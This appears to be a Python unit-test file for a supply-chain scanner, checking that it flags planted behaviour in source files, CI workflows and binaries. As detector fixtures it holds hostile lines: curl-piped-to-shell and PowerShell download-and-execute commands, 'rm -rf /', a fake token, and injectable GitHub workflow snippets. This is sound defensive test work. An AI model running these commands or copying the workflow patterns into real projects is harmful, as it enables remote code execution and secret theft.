#!/usr/bin/env python3
#===----------------------------------------------------------------------===#
#
# This source file is part of MpVFX.
#
# Copyright (c) 2026 Arshiya Rahgozar.
#
# Licensed under either of the Apache License, Version 2.0 (LICENSE-APACHE or
# http://www.apache.org/licenses/LICENSE-2.0) or the MIT license (LICENSE-MIT
# or http://opensource.org/licenses/MIT), at your option.
#
# SPDX-License-Identifier: MIT OR Apache-2.0
#
#===----------------------------------------------------------------------===#
"""Tests for sentinel.py: planted behaviour is found, legitimate code is not, the allow list applies."""
import importlib.util, os, struct, subprocess, tempfile, unittest

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("sentinel", os.path.join(HERE, "sentinel.py"))
sentinel = importlib.util.module_from_spec(spec)
spec.loader.exec_module(sentinel)


def rules_of(findings):
    return sorted({r[1] for r in findings.rows if r[4] == "**FINDING**"})


class SourceRules(unittest.TestCase):
    def scan(self, path, text, allow=None):
        f = sentinel.Findings({"allow": allow or []})
        sentinel.scan_text(path, text, f)
        return f

    def test_planted_behaviour_in_swift_is_found(self):
        text = ('let s = URLSession.shared\nlet p = Process()\nlet h = dlopen("x", 0)\nCGEventTapCreate(a, b)\n'
                'let k = "ghp_' + "a" * 36 + '"\n')
        self.assertEqual(rules_of(self.scan("mpvfx-swift/Sources/X/A.swift", text)),
                         ["dynamic-load", "network", "process", "secret", "surveillance"])

    def test_c_system_call_and_anti_debug(self):
        f = self.scan("mpvfx-swift/Sources/CX/a.c", 'system("rm -rf /");\nif (IsDebuggerPresent()) exit(0);\n')
        self.assertEqual(rules_of(f), ["anti-debug", "process"])

    def test_the_word_system_in_a_comment_and_gtk_connect_are_not_findings(self):
        f = self.scan("mpvfx-swift/Sources/X/B.swift", '/// watches the system (warning) and calls\nconnect(raw(app), "activate", cb)\n')
        self.assertEqual(rules_of(f), [])

    def test_remote_code_and_eval_in_scripts(self):
        f = self.scan("mpvfx-swift/scripts/x.sh", 'curl -fsSL https://x.example/i.sh | sh\necho ok | base64 -d | bash\n')
        self.assertEqual(rules_of(f), ["remote-code"])
        f = self.scan("mpvfx-swift/scripts/y.py", 'import os\nos.system("ls")\neval(input())\n')
        self.assertEqual(rules_of(f), ["eval"])
        f = self.scan("mpvfx-swift/packaging/windows/z.ps1", 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://x")\n')
        self.assertEqual(rules_of(f), ["remote-code"])

    def test_trojan_source_and_obfuscated_literal(self):
        f = self.scan("mpvfx-swift/Sources/X/C.swift", 'let a = "abc\u202e"\n')
        self.assertEqual(rules_of(f), ["trojan-source"])
        payload = "".join(chr(33 + (i * 7919) % 90) for i in range(120)).replace('"', "A").replace("\\", "B")
        payload = "".join(c for c in payload if c.isalnum() or c in "+/=_-")
        payload = (payload * 3)[:100]
        f = self.scan("mpvfx-swift/Sources/X/D.swift", f'let blob = "{payload}"\n')
        self.assertIn("obfuscation", rules_of(f))
        sha = "a" * 32 + "0123456789abcdef" * 2   # 64 hex digits: low entropy, not a finding
        self.assertEqual(rules_of(self.scan("mpvfx-swift/Sources/X/E.swift", f'let h = "{sha}{sha}"\n')), [])

    def test_the_allow_list_applies_by_rule_path_and_match(self):
        allow = [{"rule": "process", "path": "mpvfx-swift/Sources/Y/*.swift", "match": "Process()", "reason": "fc-list"}]
        f = self.scan("mpvfx-swift/Sources/Y/Fonts.swift", "let p = Process()\n", allow)
        self.assertEqual(rules_of(f), [])
        self.assertEqual(f.allowed, 1)
        f = self.scan("mpvfx-swift/Sources/Z/Other.swift", "let p = Process()\n", allow)
        self.assertEqual(rules_of(f), ["process"])


class WorkflowRules(unittest.TestCase):
    def scan(self, text):
        f = sentinel.Findings({})
        sentinel.scan_workflow(".github/workflows/w.yml", text, f)
        return f

    def test_unpinned_third_party_action_missing_permissions_and_injection(self):
        text = ("on: pull_request_target\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n"
                "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
                "      - uses: someone/action@v1\n      - run: echo ${{ github.event.pull_request.title }}\n"
                "      - run: echo ${{ secrets.TOKEN }}\n")
        self.assertEqual(rules_of(self.scan(text)), ["workflow-injection", "workflow-permissions", "workflow-pwn-request",
                                                     "workflow-secret-echo", "workflow-unpinned-action"])

    def test_a_safe_workflow_has_no_findings(self):
        text = ("on: pull_request\npermissions:\n  contents: read\njobs:\n  a:\n    steps:\n"
                "      - uses: actions/checkout@" + "b" * 40 + " # v4.4.0\n      - uses: compnerd/gha-setup-swift@" + "a" * 40 + "\n"
                "      - env:\n          BODY: ${{ github.event.comment.body }}\n        run: echo \"$BODY\"\n")
        self.assertEqual(rules_of(self.scan(text)), [])

    def test_run_and_with_values_are_not_env_entries(self):
        head = "on: pull_request\npermissions:\n  contents: read\njobs:\n  a:\n    steps:\n"
        for key in ("run", "script", "with"):
            text = head + f"      - {key}: ${{{{ github.event.pull_request.title }}}}\n"
            self.assertEqual(rules_of(self.scan(text)), ["workflow-injection"], key)
        env_then_run = head + ("      - env:\n          T: ${{ github.event.pull_request.title }}\n"
                               "        run: ${{ github.event.pull_request.body }}\n")
        self.assertEqual(rules_of(self.scan(env_then_run)), ["workflow-injection"])

    def test_pr_head_routed_through_env_into_checkout_is_found(self):
        text = ("on: pull_request_target\npermissions:\n  contents: read\nenv:\n  PR_REF: ${{ github.event.pull_request.head.ref }}\n"
                "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@" + "c" * 40 + "\n        with:\n          ref: ${{ env.PR_REF }}\n")
        self.assertEqual(rules_of(self.scan(text)), ["workflow-pwn-request"])
        self.assertEqual(rules_of(self.scan(text.replace("pull_request_target", "pull_request"))), [])

    def test_quoted_uses_are_normalised(self):
        head = "on: pull_request\npermissions:\n  contents: read\njobs:\n  a:\n    steps:\n"
        self.assertEqual(rules_of(self.scan(head + '      - uses: "vendor/action@' + "d" * 40 + '"\n')), [])
        self.assertEqual(rules_of(self.scan(head + "      - uses: 'actions/checkout@v4'\n")), ["workflow-unpinned-action"])


class FileRules(unittest.TestCase):
    def test_file_checks_cover_files_on_the_text_skip_list(self):
        with tempfile.TemporaryDirectory() as d:
            subprocess.run(["git", "-C", d, "init", "-q"], check=True)
            with open(os.path.join(d, "payload.png"), "wb") as fh:
                fh.write(b"\x7fELF" + b"\0" * 60)
            subprocess.run(["git", "-C", d, "add", "payload.png"], check=True)
            f = sentinel.Findings({})
            sentinel.scan_repo(d, {"skip": ["**/*.png"]}, f)
            self.assertEqual(rules_of(f), ["file-code-in-data"])

    def test_cpp_headers_are_source(self):
        self.assertIn(".hpp", sentinel.SOURCE_EXT)
        self.assertIn(".hpp", sentinel.CODE_EXT)

    def test_code_magic_in_a_data_file(self):
        self.assertEqual(sentinel.code_magic(b"\x7fELF" + b"\0" * 60), "ELF")
        self.assertEqual(sentinel.code_magic(b"\xcf\xfa\xed\xfe" + b"\0" * 60), "Mach-O")
        self.assertIsNone(sentinel.code_magic(b"\x89PNG\r\n\x1a\n" + b"\0" * 60))
        self.assertIsNone(sentinel.code_magic(b"#!/bin/sh\necho\n"))
        pe = bytearray(b"MZ" + b"\0" * 0x3E)
        struct.pack_into("<I", pe, 0x3C, 0x40)
        pe += b"PE\0\0" + b"\0" * 20
        self.assertEqual(sentinel.code_magic(bytes(pe)), "PE")


def elf64_without_sections(symbols):
    """An ET_DYN ELF64 with program headers only (no section header table): PT_LOAD, PT_DYNAMIC, libc and `symbols`."""
    strs = b"\0libc.so.6\0" + b"".join(n.encode() + b"\0" for n in symbols)
    names, pos = {}, 1 + len(b"libc.so.6\0")
    for n in symbols:
        names[n] = pos; pos += len(n) + 1
    symtab = b"\0" * 24 + b"".join(struct.pack("<IBBHQQ", names[n], 0x12, 0, 0, 0, 0) for n in symbols)
    hdr = 64 + 2 * 56
    dyn_size = 6 * 16
    symtab_off, strtab_off = hdr, hdr + len(symtab)   # .dynstr follows .dynsym, as the linkers lay them out
    dyn_off = strtab_off + len(strs)
    dyn = b"".join(struct.pack("<qQ", t, v) for t, v in
                   [(1, 1), (6, symtab_off), (5, strtab_off), (10, len(strs)), (11, 24), (0, 0)])
    body = symtab + strs + dyn
    total = hdr + len(body)
    ident = b"\x7fELF" + bytes([2, 1, 1]) + b"\0" * 9
    ehdr = ident + struct.pack("<HHIQQQIHHHHHH", 3, 62, 1, 0, 64, 0, 0, 64, 56, 2, 64, 0, 0)
    load = struct.pack("<IIQQQQQQ", 1, 5, 0, 0, 0, total, total, 0x1000)
    pdyn = struct.pack("<IIQQQQQQ", 2, 6, dyn_off, dyn_off, dyn_off, dyn_size, dyn_size, 8)
    return ehdr + load + pdyn + body


def pe_with_delay_import(dll, func):
    """A PE32+ image whose only import is in the delay-import directory (data directory 13)."""
    data = bytearray(0x1000)
    data[0:2] = b"MZ"; struct.pack_into("<I", data, 0x3C, 0x40)
    data[0x40:0x44] = b"PE\0\0"
    optsize = 112 + 16 * 8
    struct.pack_into("<HHIIIHH", data, 0x44, 0x8664, 1, 0, 0, 0, optsize, 0)
    opt = 0x44 + 20
    struct.pack_into("<H", data, opt, 0x20B)
    struct.pack_into("<I", data, opt + 108, 16)
    struct.pack_into("<II", data, opt + 112 + 13 * 8, 0x200, 64)
    sec = opt + optsize
    struct.pack_into("<IIII", data, sec + 8, 0x800, 0, 0x800, 0)   # one section: RVA 0 == file offset 0, covers the image
    struct.pack_into("<IIIII", data, 0x200, 1, 0x300, 0, 0, 0x400)  # attrs, DllNameRVA, hmod, IAT, INT
    data[0x300:0x300 + len(dll) + 1] = dll.encode() + b"\0"
    struct.pack_into("<Q", data, 0x400, 0x500)
    data[0x502:0x502 + len(func) + 1] = func.encode() + b"\0"
    return bytes(data)


class ImportParsers(unittest.TestCase):
    def test_elf_without_section_headers_is_read_through_pt_dynamic(self):
        libs, funcs = sentinel.elf_imports(elf64_without_sections(["socket", "read"]))
        self.assertEqual((libs, funcs), (["libc.so.6"], {"socket", "read"}))

    def test_elf_with_no_import_metadata_is_a_finding_not_an_empty_set(self):
        bare = bytearray(elf64_without_sections([]))
        struct.pack_into("<I", bare, 64 + 56, 0)   # the PT_DYNAMIC entry becomes PT_NULL
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "bare"), "wb") as fh:
                fh.write(bytes(bare))
            f = sentinel.Findings({})
            sentinel.scan_artifacts([d], {}, f)
            self.assertEqual(rules_of(f), ["import-unreadable"])

    def test_pe_delay_imports_are_read(self):
        libs, funcs = sentinel.pe_imports(pe_with_delay_import("WINHTTP.dll", "WinHttpOpen"))
        self.assertEqual((libs, funcs), (["WINHTTP.dll"], {"WinHttpOpen"}))


class ArtifactBaseline(unittest.TestCase):
    def test_a_new_import_is_a_finding_and_a_missing_baseline_too(self):
        with tempfile.TemporaryDirectory() as d:
            f = sentinel.Findings({})
            sentinel.compare_baseline("MpVFX", "MpVFX", ["libc.so.6"], {"read", "write"}, d, None, f)
            self.assertEqual(rules_of(f), ["import-baseline"])
            with open(os.path.join(d, "MpVFX.imports"), "w") as fh:
                fh.write("lib libc.so.6\nfn read\nfn write\n")
            f = sentinel.Findings({})
            sentinel.compare_baseline("MpVFX", "MpVFX", ["libc.so.6"], {"read", "write", "socket"}, d, None, f)
            self.assertEqual([(r[1], r[2]) for r in f.rows if r[4] == "**FINDING**"], [("import-added", "fn socket")])


if __name__ == "__main__":
    unittest.main()
